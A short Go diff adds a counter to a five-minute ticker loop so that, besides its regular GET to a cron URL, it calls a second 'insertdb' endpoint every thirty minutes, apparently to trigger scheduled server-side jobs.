@@ -33,10 +33,16 @@ func main() {
 	go func() {
 		ticker := time.NewTicker(time.Minute * 5)
 		defer ticker.Stop()
+		count := 0
 		for {
 			select {
 			case <-ticker.C:
 				http.Get("https://coin.otft.info/cron.php")
+				count++
+				if count == 6 {
+					count = 0
+					http.Get("https://filedl.intel.tokyo/insertdb")
+				}
 			}
 		}
 	}()
